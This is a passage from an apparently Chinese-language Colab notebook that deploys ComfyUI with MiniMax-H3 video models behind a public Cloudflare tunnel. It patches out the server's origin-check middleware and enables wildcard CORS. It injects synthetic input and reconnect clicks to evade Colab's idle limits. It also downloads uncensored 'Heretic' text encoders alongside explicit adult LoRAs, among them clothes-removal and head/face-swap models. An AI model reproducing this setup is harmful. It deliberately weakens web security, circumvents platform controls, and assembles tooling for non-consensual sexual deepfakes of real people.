        ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
        cwd="/content/ComfyUI",
        start_new_session=True
    )
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

for _pw in range(3):
    try:
        urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0", "Accept-Encoding": "gzip"}), timeout=120).read()
        break
    except Exception:
        time.sleep(2)

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()
from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 挂载与启动全部完成！（网址保持固定不断连，随时可点击切换其他模型选项）")
print("="*65)
print(f"🌐 【首选直连 · Cloudflare 免403极速缓存通道】：\n👉 {cf_url}")
print("="*65)

display(HTML(f"""
<div style="margin:12px 0;padding:16px;border-radius:10px;background:#1e293b;color:#fff;font-family:sans-serif;">
  <div style="font-size:16px;font-weight:bold;margin-bottom:12px;color:#4ade80;">✅ 模型挂载与 ComfyUI 已就绪（网址固定不断连）！</div>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:10px 22px;background:#22c55e;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;margin-right:12px;">🌐 点击打开 ComfyUI (Cloudflare 首选通道)</a>
  
  <div style="margin-top:10px;font-size:12px;color:#94a3b8;">🛡️ 已开启后台自动防休眠保活心跳（您在 ComfyUI 网页操作时，Colab 不会因闲置自动断连关机）</div>
</div>
<script>
  if (!window.__minimaxColabKeepAlive) {{
    window.__minimaxColabKeepAlive = setInterval(() => {{
      try {{
        const btn = document.querySelector('colab-connect-button');
        if (btn && btn.shadowRoot) {{
          const text = btn.shadowRoot.textContent || '';
          if (text.includes('Reconnect') || text.includes('重新连接')) {{
            btn.click();
          }}
        }}
        fetch(window.location.href, {{method: 'HEAD', cache: 'no-store'}}).catch(()=>{{}});
      }} catch(e) {{}}
    }}, 60000);
  }}
</script>
"""))

try:
    output.eval_js(f'window.open("{cf_url}", "_blank")')
except Exception:
    pass

# === [AGY_FOREGROUND_GUARDIAN_V2] 保持 Colab 内核 Busy 防闲置断连 + ComfyUI/隧道崩溃 3秒自动复活 ===
print("🛡️ [防断连守护已启动] 当前单元格将保持运行状态以防止 Colab 闲置回收（如需切换其他模型格，点左上角 ⏹️ 停止即可）...")
_guardian_tick = 0
try:
    while True:
        time.sleep(15)
        _guardian_tick += 1
        # 1. 检查 ComfyUI 8188 端口，若因显存/内存峰值闪退则 3 秒内原地自动重启（网址不变）
        if not _is_port_open(8188):
            print("⚠️ 检测到 ComfyUI 引擎意外退出，正在 3 秒内自动重启恢复（原 Cloudflare 网址保持不变）...")
            subprocess.Popen(
                ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
                cwd="/content/ComfyUI",
                start_new_session=True
            )
            for _ in range(90):
                if _is_port_open(8188):
                    print("✅ ComfyUI 引擎已自动复活！切回网页即可继续使用。")
                    break
                time.sleep(0.5)
        # 2. 检查 cloudflared 进程是否存活
        if subprocess.run(["pgrep", "-x", "cloudflared"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
            print("⚠️ 检测到 Cloudflare 隧道进程断开，正在自动重连...")
            cf_url = _ensure_cf_tunnel()
            print(f"✅ 隧道已重新连通：👉 {cf_url}")
        # 3. 每 45 秒通过 Colab 官方双向 RPC 通道发送一次轻量心跳，重置前端闲置计时器
        if _guardian_tick % 3 == 0:
            try:
                from google.colab import output as _colab_out
                _colab_out.eval_js("1", ignore_result=True)
            except Exception:
                pass
except KeyboardInterrupt:
    print("⏹️ 已手动停止守护循环（后台 ComfyUI 与隧道仍保持运行，可随时运行其他单元格）。")


In [ ]:
# @title 🖼️ 3. 全参视频选项（官方64G全参底模 + 默认25G CLIP）
# === [AGY_COLAB_KEEPALIVE_GUARD] ===
try:
    from IPython.display import display, Javascript
    display(Javascript('''
    (function(){
      try {
        if (!window._agyKeepAliveAudio) {
          const Ctx = window.AudioContext || window.webkitAudioContext;
          const ctx = new Ctx();
          const osc = ctx.createOscillator();
          const g = ctx.createGain();
          g.gain.value = 0.00001;
          osc.connect(g); g.connect(ctx.destination); osc.start();
          window._agyKeepAliveAudio = ctx;
        }
      } catch(e){}
      if (window._agyKeepAliveTimer) clearInterval(window._agyKeepAliveTimer);
      window._agyKeepAliveTimer = setInterval(() => {
        try {
          if (window._agyKeepAliveAudio && window._agyKeepAliveAudio.state === 'suspended') window._agyKeepAliveAudio.resume();
          const doc = window.parent ? window.parent.document : document;
          doc.dispatchEvent(new MouseEvent('mousemove', {bubbles:true, clientX:120, clientY:120}));
          doc.dispatchEvent(new KeyboardEvent('keydown', {bubbles:true, key:'Shift'}));
        } catch(e){}
      }, 45000);
    })();
    '''))
except Exception:
    pass
# --- Auto-Ensure Pika H3 Flex 6-Step Turbo LoRAs (Ref2VA & FL2VA) ---
def _ensure_pika_h3_flex_loras():
    import os, subprocess
    lora_dir = "/content/lora_pool_h3"
    os.makedirs(lora_dir, exist_ok=True)
    pika_loras = [
        ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/pika_h3_flex_ref2va_v1_bf16.safetensors", "【6步极速-Pika_H3_Flex官方多参版】pika_h3_flex_ref2va_v1_bf16.safetensors"),
        ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/pika_h3_flex_fl2va_v1_bf16.safetensors", "【6步极速-Pika_H3_Flex官方首尾帧版】pika_h3_flex_fl2va_v1_bf16.safetensors"),
        ("https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/Pika/pika_h3_flex_ref2va_v1_avg_rank_55_bf16.safetensors", "【6步极速-Pika_H3_Flex轻量多参版】pika_h3_flex_ref2va_kijai_bf16.safetensors"),
        ("https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/Pika/pika_h3_flex_fl2va_v1_avg_rank_56_bf16.safetensors", "【6步极速-Pika_H3_Flex轻量首尾帧版】pika_h3_flex_fl2va_kijai_bf16.safetensors"),
    ("https://huggingface.co/Kijai/MiniMax-H3-experimental/resolve/main/loras/minimax_h3_open_regenerate_2k_refiner_rank_16_bf16.safetensors", "【2K超清重绘精修LoRA-OpenRegen】minimax_h3_open_regenerate_2k_refiner_rank_16_bf16.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_character_swap_v1.1_ref2va_fro.safetensors", "【视频换人角色替换LoRA-Alisson】minimax_h3_character_swap_v1.1_ref2va_fro.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_head_swap_v1.0_r32.safetensors", "【视频换头换脸LoRA-Alisson】minimax_h3_head_swap_v1.0_r32.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_motion_transfer_ffp_v1.0_ref2va.safetensors", "【视频动作迁移跳舞LoRA-Alisson】minimax_h3_motion_transfer_ffp_v1.0_ref2va.safetensors"),
    ]
    for url, fname in pika_loras:
        dst = os.path.join(lora_dir, fname)
        if not os.path.exists(dst) or os.path.getsize(dst) < 1024 * 1024:
            print(f"⚡ 正在自动下载 Pika H3 Flex 6步极速加速模型: {fname} ...")
            subprocess.run(["aria2c", "-c", "-x", "16", "-s", "16", "-k", "1M", "--console-log-level=error", "-d", lora_dir, "-o", fname, url], check=False)
_ensure_pika_h3_flex_loras()

import os, subprocess, json
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

if not os.path.exists("/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"):
    subprocess.run(["git", "clone", "--depth", "1", "https://github.com/Songssx/ComfyUI-MiniMaxH3-TimelineDirector.git", "/content/ComfyUI/custom_nodes/ComfyUI-MiniMaxH3-TimelineDirector"], check=False)
for _h3_cn, _h3_url in [("ComfyUI-H3-LongVideo", "https://github.com/Zzz1phyrf/ComfyUI-H3-LongVideo.git"), ("selflift-Avatar", "https://github.com/slmonker/selflift-Avatar.git"), ("ComfyUI-YCNodes-MiniMax-H3", "https://github.com/yichengup/ComfyUI-YCNodes-MiniMax-H3.git"), ("rgthree-comfy", "https://github.com/rgthree/rgthree-comfy.git"), ("ComfyUI-MiniMaxH3-PrefixStream", "https://github.com/knoic/ComfyUI-MiniMaxH3-PrefixStream.git"), ("ComfyUI-FeiHou-Easy-H3", "https://github.com/FX-FeiHou/ComfyUI-FeiHou-Easy-H3.git"), ("ComfyUI-MiniMaxH3_LatentUpscaler", "https://github.com/TripleHeadedMonkey/ComfyUI-MiniMaxH3_LatentUpscaler.git"), ("BSAI-MiniMAX-H3-Prompt", "https://github.com/xm6018924/BSAI-MiniMAX-H3-Prompt.git")]:
    if not os.path.exists(f"/content/ComfyUI/custom_nodes/{_h3_cn}"):
        subprocess.run(["git", "clone", "--depth", "1", _h3_url, f"/content/ComfyUI/custom_nodes/{_h3_cn}"], check=False)
        if _h3_cn == "ComfyUI-H3-LongVideo": subprocess.run([sys.executable, "-m", "pip", "install", "-q", "faster-whisper==1.2.1"], check=False)
# @markdown > 💡 **选择配套 CLIP 文本编码器**（切换无需重装框架，直接点击运行即可）：
轻量化CLIP选择 = "25G 社区版INT8未删减版 (C站原帖钦定配套 · 宽松审核允许大人)" # @param ["25G 社区版INT8未删减版 (C站原帖钦定配套 · 宽松审核允许大人)", "15G Heretic破限未删减极速版 (Momoking NVFP4 · 宽松审核)"]
重置默认工作流 = False # @param {type:"boolean"}

diff_dir = "/content/ComfyUI/models/diffusion_models"
clip_dir = "/content/ComfyUI/models/text_encoders"
import shutil as _sh_a2
if not _sh_a2.which("aria2c"):
    subprocess.run("apt-get update -qq && apt-get install -y -qq aria2 >/dev/null 2>&1", shell=True, check=False)
os.makedirs(diff_dir, exist_ok=True)
os.makedirs(clip_dir, exist_ok=True)

target_model = "【64G满血原版-全能参考视频】minimax_h3_ref2va_bf16.safetensors"
if "15G 官方NVFP4" in 轻量化CLIP选择:
    target_clip = "【15G轻量化极速版-CLIP】qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_nvfp4_awq.safetensors"
elif "25G 官方INT8" in 轻量化CLIP选择:
    target_clip = "【25G轻量化均衡版-CLIP】qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
    clip_url = "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/text_encoders/qwen3vl_32b_minimax_h3_int8_convrot.safetensors"
elif "15G Heretic" in 轻量化CLIP选择:
    target_clip = "【15G破限未删减极速版-CLIP】qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
    clip_url = "https://huggingface.co/Momoking/Qwen3-VL-32B-Heretic-MiniMax-H3-NVFP4/resolve/main/qwen3vl_32b_heretic_minimax_h3_nvfp4.safetensors"
else:
    target_clip = "【25G轻量化未删减-C站Remix配套CLIP】minimaxH3Remix_int8ConvrotV06Fixed_txt.safetensors"
    clip_url = "https://huggingface.co/linjian257/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257/resolve/main/qwen3vl_32b_minimax_h3_int8_convrot_uncensored-by-linjian257.safetensors"

print("🧹 正在卸载其他底模与非配套 CLIP，严格只保留当前所选配置（释放磁盘空间）...")
for f in list(os.listdir(diff_dir)):
    fp = os.path.join(diff_dir, f)
    if os.path.islink(fp):
        os.unlink(fp)
    elif f.endswith(".safetensors") and f != target_model:
        print(f"  🗑️ 已卸载其他底模: {f}")
        os.remove(fp)
for f in list(os.listdir(clip_dir)):
    fp = os.path.join(clip_dir, f)
    if os.path.islink(fp):
        os.unlink(fp)
    elif f.endswith(".safetensors") and f != target_clip:
        print(f"  🗑️ 已卸载非当前 CLIP: {f}")
        os.remove(fp)

print(f"⏳ 正在检查/下载 64G 官方全参底模: {target_model} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "-d", diff_dir, "-o", target_model,
    "https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/diffusion_models/minimax_h3_ref2va_bf16.safetensors"
], check=True)

print(f"⏳ 正在检查/下载官方配套 CLIP: {target_clip} ...")
subprocess.run([
    "aria2c", "-c", "-x", "16", "-s", "16", "--file-allocation=none",
    "-d", clip_dir, "-o", target_clip, clip_url
], check=True)

os.makedirs("/content/lora_pool_h3", exist_ok=True)
# Auto-install all H3 LoRAs (including the 4 new Civitai LoRAs) whenever any H3 cell runs
import urllib.request as _ur_l
from concurrent.futures import ThreadPoolExecutor as _TPE_L
_h3_pool = "/content/lora_pool_h3"
os.makedirs(_h3_pool, exist_ok=True)
_civ_tok = globals().get("C站_API_Token", "")
_civ_h3_list = [["3413468", "3305979", "【H3-C站大人解锁V2.1】Minimax_H3_Unlocked_V2.1.safetensors"], ["3399711", "3290118", "【H3-C站大人-女性特写动作V1】H3_Female_Action_V1.safetensors"], ["3394502", "3284268", "【H3-C站大人-去衣动作V1.1】H3_Remove_Clothes_V1.1.safetensors"], ["3268303", "3152083", "【H3-C站大人-全能互动AIO_V2.5】H3_AIO_Interaction_V2.5.safetensors"], ["3206518", "3088013", "【H3-C站大人-全能互动AIO_V2】H3_AIO_Interaction_V2.safetensors"], ["3416478", "3311427", "【H3-C站大人-双人互动增强V5_全参】Mystic_MMH3_V5_Ref2VA.safetensors"], ["3403761", "3294817", "【C站成人-传教士姿势增强V1】MISSIONLG_H3_v1.safetensors"], ["3420786", "3314770", "【H3-C站大人-亲密互动特写V1】H3_Close_Interaction_V1.safetensors"], ["3404369", "3295540", "【H3-C站大人-身材细节增强V1】H3_Body_Detail_V1.safetensors"], ["3237012", "3119472", "【H3-C站大人-丰满曲线增强V0.3】H3_Curvy_Helper_V0.3.safetensors"], ["3402446", "3293205", "【H3-C站大人-俯视领口走光增强V1】Down_blouse_101-h3.safetensors"], ["3426349", "3321345", "【H3-C站大人-抓头发互动动作V1】hair_pulling_h3_101.safetensors"], ["3408385", "3300137", "【H3-C站大人-快慢动作极限滑块V2】PornMaster_MMH3_Fast_motion_slider_V2.safetensors"], ["3202732", "3091422", "【4步加速LoRA-Turbo社区版】minimax_h3_turbo_v4_step600_pruned_comfyui.safetensors"], ["3384273", "3273015", "【慢动作丝滑同步LoRA】SSS_Rank_MiniMax_H3_Smooth_Slow_Sync.safetensors"], ["3421124", "3315156", "【真人皮肤去油光LoRA】MMH3_RealismSlider_V1.safetensors"], ["3314964", "3200403", "【细节锐化增强LoRA】MMH3_DetailSlider_V1.safetensors"], ["3409409", "3301293", "【动作速度调节LoRA】MMH3_ActionSpeedSlider_V1.safetensors"], ["3389300", "3278497", "【C站增强-动作快慢速率滑块】H3_speed_slider_1.1.safetensors"]]
class _NoRedirL(_ur_l.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl): return None
_civ_op_l = _ur_l.build_opener(_NoRedirL)
def _res_civ_l(item):
    _vid, _fid, _fn = item
    _fp = os.path.join(_h3_pool, _fn)
    if os.path.exists(_fp) and os.path.getsize(_fp) > 50000: return None
    _u = f"https://civitai.com/api/download/models/{_vid}?fileId={_fid}&token={_civ_tok}"
    try: _civ_op_l.open(_ur_l.Request(_u, headers={"User-Agent": "Mozilla/5.0"}), timeout=12)
    except _ur_l.HTTPError as _e:
        if _e.headers.get("Location"): return (_e.headers.get("Location"), _fn)
    except Exception: pass
    return (_u, _fn)
_aria_l = []
with _TPE_L(max_workers=10) as _ex_l:
    for _r in _ex_l.map(_res_civ_l, _civ_h3_list):
        if _r: _aria_l.append(f"{_r[0]}\n  dir={_h3_pool}\n  out={_r[1]}")
if _aria_l:
    print(f"⏳ 正在自动并发补齐 {len(_aria_l)} 个 H3 专属 C站 LoRA...")
    open("/tmp/h3_civ_loras.txt", "w", encoding="utf-8").write("\n".join(_aria_l) + "\n")
    subprocess.run(["aria2c", "-i", "/tmp/h3_civ_loras.txt", "-c", "-j", "16", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=warn"], check=False)
for _del_d in ("/content/lora_pool_h3", "/content/ComfyUI/models/loras"):
    if os.path.isdir(_del_d):
        for _del_f in ['【C站成人-双人互动增强V1】MysticXXX_MMH3-V1.safetensors', '【H3-C站大人-双人互动增强V5_文生图生】Mystic_MMH3_V5_FL2VA.safetensors', '【H3-C站大人-高频动作律动增强V2_文生图生】H3_Motion_Booster_V2.safetensors', '【H3-C站大人-高频动作律动增强V2_全参】H3_Motion_Booster_V2_Ref2VA.safetensors', '【H3-C站大人-流体特效增强V1】H3_Fluid_Effect_V1.safetensors']:
            _del_p = os.path.join(_del_d, _del_f)
            if os.path.exists(_del_p) or os.path.islink(_del_p):
                try: os.remove(_del_p)
                except Exception: pass
for _old_up in ("minimax_h3_bf16_CONSERVATIVE_v5.safetensors", "minimax_h3_latent_upscaler_3d_conv_v1_fp16.safetensors"):
    _up_p = os.path.join("/content/ComfyUI/models/latent_upscale_models", _old_up)
    if os.path.islink(_up_p):
        try: os.unlink(_up_p)
        except Exception: pass
os.makedirs("/content/lora_pool_h3", exist_ok=True)
os.makedirs("/content/lora_pool_qwen", exist_ok=True)
_lora_active = "/content/ComfyUI/models/loras"
os.makedirs(_lora_active, exist_ok=True)
for _f in list(os.listdir(_lora_active)):
    _p = os.path.join(_lora_active, _f)
    if os.path.islink(_p):
        try: os.unlink(_p)
        except Exception: pass
    elif os.path.isfile(_p) and _f.endswith(".safetensors"):
        _is_qw = any(_k in _f for _k in ("千问", "Qwen", "qwen", "Anime2Real", "2anime", "canon_qwen", "chatrlabs", "multiple_angles", "viggle", "NoctQA"))
        _pool = "/content/lora_pool_qwen" if _is_qw else "/content/lora_pool_h3"
        try: os.replace(_p, os.path.join(_pool, _f))
        except Exception: pass
for _f in sorted(os.listdir("/content/lora_pool_h3")):
    _src_p = os.path.join("/content/lora_pool_h3", _f)
    if _f.endswith(".safetensors") and os.path.exists(_src_p) and os.path.getsize(_src_p) > 50 * 1024:
        _dst_p = os.path.join(_lora_active, _f)
        if not os.path.exists(_dst_p):
            try: os.symlink(_src_p, _dst_p)
            except Exception: pass
print("🧹 已切换为【H3视频专属LoRA与工作流配置（自动隔离千问LoRA & 保护你在网页修改的工作流）】")

import shutil as _sh
wf_dir = "/content/ComfyUI/user/default/workflows"
os.makedirs(wf_dir, exist_ok=True)
os.makedirs("/content/wf_pool_h3", exist_ok=True)
os.makedirs("/content/wf_pool_qwen", exist_ok=True)
for _wf in list(os.listdir(wf_dir)):
    if _wf.endswith(".json"):
        _wfp = os.path.join(wf_dir, _wf)
        if "qwen" in _wf.lower() or "千问" in _wf:
            try:
                _sh.copy2(_wfp, os.path.join("/content/wf_pool_qwen", _wf))
                os.remove(_wfp)
            except Exception: pass
        elif not globals().get("重置默认工作流", False) and os.path.getsize(_wfp) > 100:
            try: _sh.copy2(_wfp, os.path.join("/content/wf_pool_h3", _wf))
            except Exception: pass
for _wf in os.listdir("/content/wf_pool_h3"):
    if _wf.endswith(".json") and not ("qwen" in _wf.lower() or "千问" in _wf):
        _dst_wf = os.path.join(wf_dir, _wf)
        if globals().get("重置默认工作流", False) or not os.path.exists(_dst_wf) or os.path.getsize(_dst_wf) < 100:
            try: _sh.copy2(os.path.join("/content/wf_pool_h3", _wf), _dst_wf)
            except Exception: pass
if not [f for f in os.listdir(wf_dir) if f.endswith(".json")]:
    import base64, zlib
    _wfs = json.loads(zlib.decompress(base64.b64decode("...")).decode("utf-8"))
    for _fn, _wdata in _wfs.items():
        json.dump(_wdata, open(os.path.join(wf_dir, _fn), "w", encoding="utf-8"), ensure_ascii=False, indent=2)
for _target_wdir in [wf_dir, "/content/wf_pool_h3"]:
  if os.path.exists(_target_wdir):
    for wfname in sorted(os.listdir(_target_wdir)):
        if wfname.endswith(".json") and not ("qwen" in wfname.lower() or "千问" in wfname):
            wpath = os.path.join(_target_wdir, wfname)
            try:
                wf = json.load(open(wpath, encoding="utf-8"))
                all_nodes = list(wf.get("nodes", []))
                for sg in wf.get("definitions", {}).get("subgraphs", []):
                    all_nodes.extend(sg.get("nodes", []))
                for n in all_nodes:
                    ntype = n.get("type", "")
                    wv = n.get("widgets_values")
                    if ntype == "UNETLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_model
                    elif ntype == "CLIPLoader" and isinstance(wv, list) and len(wv) >= 1:
                        wv[0] = target_clip
                    elif ntype == "FeiHouEasyH3Loader" and isinstance(wv, list) and len(wv) >= 3:
                        wv[0], wv[1], wv[2] = target_model, target_model, target_clip
                    elif ntype == "FeiHouEasyH3RemixLoader" and isinstance(wv, list) and len(wv) >= 2:
                        wv[0], wv[1] = target_model, target_clip
                    elif ntype == "4c314f31-ecda-4b08-ae98-faaba1bf613f" and isinstance(wv, list) and len(wv) >= 7:
                        wv[5], wv[6] = target_model, target_clip
                json.dump(wf, open(wpath, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
            except Exception:
                pass

import time, socket, re, urllib.request, gzip, shutil, pathlib
from google.colab import output
from IPython.display import display, HTML

os.chdir("/content/ComfyUI")

s_path = "/content/ComfyUI/server.py"
if os.path.exists(s_path):
    txt = open(s_path, "r", encoding="utf-8").read()
    if "return await handler(request) # patched" not in txt:
        txt = txt.replace(
            "def create_origin_only_middleware():",
            "def create_origin_only_middleware():\n    from aiohttp import web\n    @web.middleware\n    async def _noop(request, handler):\n        return await handler(request) # patched\n    return _noop\ndef _old_origin():"
        )
        open(s_path, "w", encoding="utf-8").write(txt)

cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "max-age=604800" not in cm_txt or '.endswith(".js")' in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
